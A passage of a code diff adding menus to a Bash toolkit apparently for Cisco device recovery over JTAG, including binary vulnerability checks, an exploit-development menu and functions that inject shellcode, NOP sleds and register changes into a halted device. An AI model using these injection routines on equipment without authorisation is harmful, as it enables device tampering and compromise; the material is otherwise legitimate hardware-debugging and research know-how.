+        local format_strings=$(strings "$binary_file" | grep -E '%[0-9]*[sdxpn]' | head -10)
+
+        if [ -n "$format_strings" ]; then
+            echo "Found format string patterns (sample):"
+            echo "$format_strings" | sed 's/^/  /'
+            echo "  (Manual review required to confirm vulnerabilities)"
+        else
+            echo "No format string patterns detected"
+        fi
+    fi
+
+    echo
+    echo ">>> Analysis 4/5: Buffer Overflow Candidates"
+    echo "---------------------------------------------"
+
+    if command -v strings &> /dev/null && command -v objdump &> /dev/null; then
+        echo "Analyzing for potential overflow points..."
+
+        # Check for strcpy, gets, scanf usage
+        local has_strcpy=$(objdump -d "$binary_file" 2>/dev/null | grep -c 'strcpy' || echo 0)
+        local has_gets=$(objdump -d "$binary_file" 2>/dev/null | grep -c '<gets@plt>' || echo 0)
+        local has_scanf=$(objdump -d "$binary_file" 2>/dev/null | grep -c 'scanf' || echo 0)
+
+        echo "  strcpy calls: $has_strcpy"
+        echo "  gets calls: $has_gets (CRITICAL if > 0)"
+        echo "  scanf calls: $has_scanf"
+
+        if [ "$has_gets" -gt 0 ]; then
+            echo
+            echo "  CRITICAL: gets() is inherently unsafe and leads to buffer overflows!"
+        fi
+    fi
+
+    echo
+    echo ">>> Analysis 5/5: ASLR Status (System-Wide)"
+    echo "--------------------------------------------"
+
+    if [ -f /proc/sys/kernel/randomize_va_space ]; then
+        local aslr_val=$(cat /proc/sys/kernel/randomize_va_space)
+        echo "ASLR setting: $aslr_val"
+        case "$aslr_val" in
+            0) echo "  DISABLED - No randomization" ;;
+            1) echo "  PARTIAL - Conservative randomization" ;;
+            2) echo "  FULL - Full randomization (default)" ;;
+        esac
+    else
+        echo "Cannot determine ASLR status"
+    fi
+
+    echo
+    echo "========================================="
+    echo "Vulnerability Analysis Complete!"
+    echo "========================================="
+    echo "Report saved to: $report_file"
+    echo
+    echo "RECOMMENDATIONS:"
+    echo "  1. Test binary with fuzzing tools (AFL, libFuzzer)"
+    echo "  2. Use GDB with pattern_create/pattern_offset for exploit development"
+    echo "  3. Check for heap-based vulnerabilities separately"
+    echo "  4. Review source code if available"
+    echo
+
+    log_message "INFO" "Vulnerability analysis completed: $report_file"
+    read -r -p "Press Enter to continue..."
+}
+
+menu_exploit_dev_tools() {
+    while true; do
+        print_header
+        echo "--- Automated Exploit Development Tools ---"
+        echo
+        echo "  1) ROP Gadget Finder"
+        echo "     (Find Return-Oriented Programming gadgets)"
+        echo
+        echo "  2) Shellcode Generator"
+        echo "     (Generate payloads for ARM, MIPS, x86)"
+        echo
+        echo "  3) Buffer Overflow Detector"
+        echo "     (Analyze binaries for vulnerabilities)"
+        echo
+        echo "  b) Back to Main Menu"
+        echo
+        read -r -p "Choose an option: " choice
+
+        case "$choice" in
+            1) exploit_rop_gadget_finder ;;
+            2) exploit_shellcode_generator ;;
+            3) exploit_buffer_overflow_detector ;;
+            b) break ;;
+            *) echo "Invalid option." && sleep 1 ;;
+        esac
+    done
+}
+
+# --- End Automated Exploit Development Tools ---
+
+# --- Configuration Management System ---
+
+config_save_profile() {
+    local profile_dir="$HOME/.config/cisco_recovery/profiles"
+    mkdir -p "$profile_dir"
+
+    print_header
+    echo "=== Save Current Configuration Profile ==="
+    echo
+    echo "Current settings:"
+    echo "  Platform: $PLATFORM"
+    echo "  JTAG Adapter: $JTAG_ADAPTER"
+    echo "  Architecture: $TARGET_ARCH"
+    echo
+
+    read -r -p "Enter profile name: " profile_name
+
+    if [ -z "$profile_name" ]; then
+        echo "ERROR: Profile name cannot be empty"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    local profile_file="$profile_dir/${profile_name}.conf"
+
+    cat > "$profile_file" <<EOF
+# Cisco Recovery Tool Configuration Profile
+# Profile: $profile_name
+# Created: $(date)
+
+PLATFORM="$PLATFORM"
+JTAG_ADAPTER="$JTAG_ADAPTER"
+TARGET_ARCH="$TARGET_ARCH"
+OPENOCD_SCRIPT_PATH="$OPENOCD_SCRIPT_PATH"
+EOF
+
+    echo "SUCCESS: Profile saved to $profile_file"
+    log_message "INFO" "Saved configuration profile: $profile_name"
+    read -r -p "Press Enter to continue..."
+}
+
+config_load_profile() {
+    local profile_dir="$HOME/.config/cisco_recovery/profiles"
+
+    print_header
+    echo "=== Load Configuration Profile ==="
+    echo
+
+    if [ ! -d "$profile_dir" ] || [ -z "$(ls -A "$profile_dir" 2>/dev/null)" ]; then
+        echo "No profiles found in $profile_dir"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    echo "Available profiles:"
+    local i=1
+    local profiles=()
+    for profile in "$profile_dir"/*.conf; do
+        if [ -f "$profile" ]; then
+            profiles+=("$profile")
+            echo "  $i) $(basename "$profile" .conf)"
+            i=$((i + 1))
+        fi
+    done
+
+    echo
+    read -r -p "Select profile number: " profile_num
+
+    if [ "$profile_num" -ge 1 ] && [ "$profile_num" -lt "$i" ]; then
+        local selected_profile="${profiles[$((profile_num - 1))]}"
+
+        echo "Loading profile: $(basename "$selected_profile" .conf)"
+        source "$selected_profile"
+
+        echo "SUCCESS: Profile loaded"
+        echo "  Platform: $PLATFORM"
+        echo "  JTAG Adapter: $JTAG_ADAPTER"
+        echo "  Architecture: $TARGET_ARCH"
+
+        log_message "INFO" "Loaded configuration profile: $(basename "$selected_profile" .conf)"
+    else
+        echo "ERROR: Invalid selection"
+    fi
+
+    read -r -p "Press Enter to continue..."
+}
+
+config_quick_launch() {
+    print_header
+    echo "=== Quick Launch System ==="
+    echo
+    echo "Launch common workflows with saved configurations"
+    echo
+    echo "  1) Quick Password Recovery (ISR)"
+    echo "  2) Quick JTAG Boot Intercept"
+    echo "  3) Quick Firmware Extract & Modify"
+    echo "  4) Quick Vulnerability Scan"
+    echo "  5) Quick ROP Chain Development"
+    echo "  b) Back"
+    echo
+    read -r -p "Choose workflow: " workflow_choice
+
+    case "$workflow_choice" in
+        1)
+            echo
+            echo "=== Quick Password Recovery ==="
+            PLATFORM="isr"
+            TARGET_ARCH="arm"
+            echo "Auto-configured for ISR platform"
+            echo "Launching password recovery menu..."
+            sleep 2
+            menu_password_recovery
+            ;;
+        2)
+            echo
+            echo "=== Quick JTAG Boot Intercept ==="
+            echo "Launching automated boot interception..."
+            sleep 1
+            jtag_auto_boot_interrupt
+            ;;
+        3)
+            echo
+            echo "=== Quick Firmware Extract & Modify ==="
+            read -r -p "Enter firmware file path: " fw_file
+            if [ -f "$fw_file" ]; then
+                firmware_fs_extract
+                firmware_fs_modify
+            else
+                echo "ERROR: Firmware file not found"
+            fi
+            ;;
+        4)
+            echo
+            echo "=== Quick Vulnerability Scan ==="
+            read -r -p "Enter firmware/binary path: " scan_file
+            if [ -f "$scan_file" ]; then
+                firmware_vulnerability_scan
+            else
+                echo "ERROR: File not found"
+            fi
+            ;;
+        5)
+            echo
+            echo "=== Quick ROP Chain Development ==="
+            read -r -p "Enter binary path: " rop_file
+            if [ -f "$rop_file" ]; then
+                exploit_rop_gadget_finder
+            else
+                echo "ERROR: Binary not found"
+            fi
+            ;;
+        b)
+            return 0
+            ;;
+        *)
+            echo "Invalid option"
+            sleep 1
+            ;;
+    esac
+
+    read -r -p "Press Enter to continue..."
+}
+
+menu_config_management() {
+    while true; do
+        print_header
+        echo "--- Configuration Management System ---"
+        echo
+        echo "  1) Save Current Profile"
+        echo "     (Save platform, JTAG adapter, architecture settings)"
+        echo
+        echo "  2) Load Profile"
+        echo "     (Restore saved configuration)"
+        echo
+        echo "  3) Quick Launch Workflows"
+        echo "     (Pre-configured common tasks)"
+        echo
+        echo "  b) Back to Main Menu"
+        echo
+        read -r -p "Choose an option: " choice
+
+        case "$choice" in
+            1) config_save_profile ;;
+            2) config_load_profile ;;
+            3) config_quick_launch ;;
+            b) break ;;
+            *) echo "Invalid option." && sleep 1 ;;
+        esac
+    done
+}
+
+# --- End Configuration Management System ---
+
+# --- Live Memory Manipulation During Boot ---
+
+live_memory_poke_peek() {
+    print_header
+    echo "=== Live Memory Poke/Peek (JTAG) ==="
+    echo
+    echo "Read and write memory while device is halted"
+    echo "WARNING: Incorrect memory writes can brick the device!"
+    echo
+
+    if [ "$JTAG_ADAPTER" = "auto" ]; then
+        echo "ERROR: JTAG adapter not configured"
+        echo "Please configure JTAG adapter first (Menu 1)"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    echo "  1) Peek (Read memory)"
+    echo "  2) Poke (Write memory)"
+    echo "  3) Dump memory range"
+    echo "  4) Fill memory with pattern"
+    echo "  b) Back"
+    echo
+    read -r -p "Choose operation: " op_choice
+
+    case "$op_choice" in
+        1)
+            echo
+            echo "--- Memory Peek (Read) ---"
+            read -r -p "Enter memory address (hex, e.g., 0x80000000): " mem_addr
+            read -r -p "Enter number of bytes to read (default 16): " read_bytes
+            read_bytes=${read_bytes:-16}
+
+            local dump_file="${SESSION_DIR}/mem_peek_${mem_addr}_$(date +%s).bin"
+
+            echo "Reading $read_bytes bytes from $mem_addr..."
+            {
+                sleep 1
+                echo "halt"
+                sleep 1
+                echo "dump_image \"$dump_file\" $mem_addr $read_bytes"
+                sleep 2
+                echo "resume"
+                sleep 1
+                echo "exit"
+            } | telnet localhost 4444 2>&1
+
+            if [ -f "$dump_file" ]; then
+                echo "SUCCESS: Memory dumped to $dump_file"
+                echo
+                echo "Hex dump:"
+                xxd "$dump_file" | head -20
+            else
+                echo "ERROR: Memory read failed"
+            fi
+            ;;
+        2)
+            echo
+            echo "--- Memory Poke (Write) ---"
+            echo "WARNING: This can brick the device if used incorrectly!"
+            read -r -p "Enter memory address (hex): " mem_addr
+            read -r -p "Enter value to write (hex, e.g., 0xDEADBEEF): " mem_value
+            read -r -p "Enter word size (8/16/32/64 bits): " word_size
+
+            echo
+            read -r -p "Are you SURE you want to write $mem_value to $mem_addr? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                echo "Writing $mem_value to $mem_addr..."
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "mww $mem_addr $mem_value"
+                    sleep 1
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "WARNING" "Memory write: $mem_value -> $mem_addr"
+            else
+                echo "Cancelled"
+            fi
+            ;;
+        3)
+            echo
+            echo "--- Dump Memory Range ---"
+            read -r -p "Enter start address (hex): " start_addr
+            read -r -p "Enter end address (hex): " end_addr
+
+            # Calculate size
+            local start_dec=$((start_addr))
+            local end_dec=$((end_addr))
+            local size=$((end_dec - start_dec))
+
+            local dump_file="${SESSION_DIR}/mem_range_${start_addr}_${end_addr}_$(date +%s).bin"
+
+            echo "Dumping $size bytes from $start_addr to $end_addr..."
+            {
+                sleep 1
+                echo "halt"
+                sleep 1
+                echo "dump_image \"$dump_file\" $start_addr $size"
+                sleep 3
+                echo "resume"
+                sleep 1
+                echo "exit"
+            } | telnet localhost 4444 2>&1
+
+            echo "Memory range dumped to: $dump_file"
+            ;;
+        4)
+            echo
+            echo "--- Fill Memory with Pattern ---"
+            read -r -p "Enter start address (hex): " start_addr
+            read -r -p "Enter size in bytes: " fill_size
+            read -r -p "Enter fill pattern (hex, e.g., 0x90 for NOP): " fill_pattern
+
+            echo
+            read -r -p "Fill $fill_size bytes at $start_addr with $fill_pattern? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                echo "Filling memory..."
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    for ((i=0; i<fill_size; i+=4)); do
+                        echo "mww $((start_addr + i)) $fill_pattern"
+                    done
+                    sleep 2
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "WARNING" "Memory fill: $fill_pattern at $start_addr ($fill_size bytes)"
+            else
+                echo "Cancelled"
+            fi
+            ;;
+    esac
+
+    read -r -p "Press Enter to continue..."
+}
+
+live_register_manipulation() {
+    print_header
+    echo "=== Live Register Manipulation ==="
+    echo
+    echo "Read and modify CPU registers while device is halted"
+    echo
+
+    echo "  1) Read all registers"
+    echo "  2) Read specific register"
+    echo "  3) Modify register"
+    echo "  4) Set PC (Program Counter)"
+    echo "  5) Modify Stack Pointer"
+    echo "  b) Back"
+    echo
+    read -r -p "Choose operation: " reg_choice
+
+    case "$reg_choice" in
+        1)
+            echo
+            echo "--- Reading All Registers ---"
+            {
+                sleep 1
+                echo "halt"
+                sleep 1
+                echo "reg"
+                sleep 2
+                echo "resume"
+                sleep 1
+                echo "exit"
+            } | telnet localhost 4444 2>&1 | tee "${SESSION_DIR}/registers_$(date +%s).txt"
+            ;;
+        2)
+            echo
+            echo "--- Read Specific Register ---"
+            read -r -p "Enter register name (e.g., r0, pc, sp): " reg_name
+            {
+                sleep 1
+                echo "halt"
+                sleep 1
+                echo "reg $reg_name"
+                sleep 1
+                echo "resume"
+                sleep 1
+                echo "exit"
+            } | telnet localhost 4444 2>&1
+            ;;
+        3)
+            echo
+            echo "--- Modify Register ---"
+            read -r -p "Enter register name: " reg_name
+            read -r -p "Enter new value (hex): " reg_value
+
+            echo
+            read -r -p "Set $reg_name = $reg_value? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "reg $reg_name $reg_value"
+                    sleep 1
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "WARNING" "Register modified: $reg_name = $reg_value"
+            fi
+            ;;
+        4)
+            echo
+            echo "--- Set Program Counter ---"
+            echo "WARNING: This will redirect execution flow!"
+            read -r -p "Enter new PC value (hex): " pc_value
+
+            echo
+            read -r -p "Set PC = $pc_value? This will jump execution! (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "reg pc $pc_value"
+                    sleep 1
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "CRITICAL" "PC modified: PC = $pc_value"
+            fi
+            ;;
+        5)
+            echo
+            echo "--- Modify Stack Pointer ---"
+            read -r -p "Enter new SP value (hex): " sp_value
+
+            echo
+            read -r -p "Set SP = $sp_value? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "reg sp $sp_value"
+                    sleep 1
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "WARNING" "SP modified: SP = $sp_value"
+            fi
+            ;;
+    esac
+
+    read -r -p "Press Enter to continue..."
+}
+
+live_code_injection() {
+    print_header
+    echo "=== Runtime Code Injection ==="
+    echo
+    echo "Inject and execute code while device is running"
+    echo "WARNING: Experimental feature - can crash the device!"
+    echo
+
+    echo "  1) Inject ARM shellcode"
+    echo "  2) Inject MIPS shellcode"
+    echo "  3) Inject from file"
+    echo "  4) Inject NOP sled"
+    echo "  b) Back"
+    echo
+    read -r -p "Choose operation: " inj_choice
+
+    case "$inj_choice" in
+        1|2)
+            local arch="ARM"
+            [ "$inj_choice" = "2" ] && arch="MIPS"
+
+            echo
+            echo "--- Inject $arch Shellcode ---"
+            read -r -p "Enter injection address (hex): " inj_addr
+            read -r -p "Enter shellcode in hex (e.g., 01020304...): " shellcode_hex
+
+            # Convert hex to binary
+            local shellcode_file="${SESSION_DIR}/injected_code_$(date +%s).bin"
+            echo "$shellcode_hex" | xxd -r -p > "$shellcode_file"
+
+            echo
+            read -r -p "Inject shellcode at $inj_addr? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "load_image \"$shellcode_file\" $inj_addr"
+                    sleep 2
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "CRITICAL" "Code injected at $inj_addr"
+            fi
+            ;;
+        3)
+            echo
+            echo "--- Inject from File ---"
+            read -r -p "Enter file path: " code_file
+            read -r -p "Enter injection address (hex): " inj_addr
+
+            if [ ! -f "$code_file" ]; then
+                echo "ERROR: File not found"
+            else
+                echo
+                read -r -p "Inject $(basename "$code_file") at $inj_addr? (yes/no): " confirm
+
+                if [ "$confirm" = "yes" ]; then
+                    {
+                        sleep 1
+                        echo "halt"
+                        sleep 1
+                        echo "load_image \"$code_file\" $inj_addr"
+                        sleep 2
+                        echo "resume"
+                        sleep 1
+                        echo "exit"
+                    } | telnet localhost 4444 2>&1
+
+                    log_message "CRITICAL" "Code file injected: $code_file at $inj_addr"
+                fi
+            fi
+            ;;
+        4)
+            echo
+            echo "--- Inject NOP Sled ---"
+            read -r -p "Enter start address (hex): " nop_addr
+            read -r -p "Enter NOP count: " nop_count
+            read -r -p "NOP opcode (0x90 for x86, 0x00 for ARM, 0x00000000 for MIPS): " nop_opcode
+
+            echo
+            read -r -p "Inject $nop_count NOPs at $nop_addr? (yes/no): " confirm
+
+            if [ "$confirm" = "yes" ]; then
+                local nop_file="${SESSION_DIR}/nop_sled_$(date +%s).bin"
+                for ((i=0; i<nop_count; i++)); do
+                    echo -n "$nop_opcode" | xxd -r -p >> "$nop_file"
+                done
+
+                {
+                    sleep 1
+                    echo "halt"
+                    sleep 1
+                    echo "load_image \"$nop_file\" $nop_addr"
+                    sleep 2
+                    echo "resume"
+                    sleep 1
+                    echo "exit"
+                } | telnet localhost 4444 2>&1
+
+                log_message "WARNING" "NOP sled injected at $nop_addr ($nop_count NOPs)"
+            fi
+            ;;
+    esac
+
+    read -r -p "Press Enter to continue..."
+}
+
+menu_live_memory_manipulation() {
+    while true; do
+        print_header
+        echo "--- Live Memory Manipulation During Boot ---"
+        echo
+        echo "  1) Memory Poke/Peek"
+        echo "     (Read/write memory via JTAG)"
+        echo
+        echo "  2) Register Manipulation"
+        echo "     (Read/modify CPU registers)"
+        echo
+        echo "  3) Runtime Code Injection"
+        echo "     (Inject shellcode while running)"
+        echo
+        echo "  b) Back to Main Menu"
+        echo
+        read -r -p "Choose an option: " choice
+
+        case "$choice" in
+            1) live_memory_poke_peek ;;
+            2) live_register_manipulation ;;
+            3) live_code_injection ;;
+            b) break ;;
+            *) echo "Invalid option." && sleep 1 ;;
+        esac
+    done
+}
+
+# --- End Live Memory Manipulation During Boot ---
+
 menu_set_architecture() {
     while true; do
         print_header
@@ -3446,8 +5126,12 @@ main_menu() {
         echo "  5) Firmware Modification Workshop"
         echo "  6) Advanced Firmware Analysis Suite"
         echo "  7) Bootloader Development Kit"
-        echo "  8) Memory Analysis"
-        echo "  9) Firmware Manipulation"
+        echo "  8) Firmware Filesystem Tools"
+        echo "  9) Automated Exploit Development Tools"
+        echo " 10) Configuration Management System"
+        echo " 11) Live Memory Manipulation During Boot"
+        echo " 12) Memory Analysis"
+        echo " 13) Firmware Manipulation"
         echo "  b) Exit"
         echo
         read -r -p "Choose an option: " choice
@@ -3460,8 +5144,12 @@ main_menu() {
             5) menu_firmware_workshop ;;
             6) menu_firmware_analysis_suite ;;
             7) menu_bootloader_devkit ;;
-            8) menu_memory_analysis ;;
-            9) menu_firmware_manipulation ;;
+            8) menu_firmware_filesystem_tools ;;
+            9) menu_exploit_dev_tools ;;
+            10) menu_config_management ;;
+            11) menu_live_memory_manipulation ;;
+            12) menu_memory_analysis ;;
+            13) menu_firmware_manipulation ;;
             b) break ;;
             *) echo "Invalid option. Please try again." && sleep 1 ;;
         esac
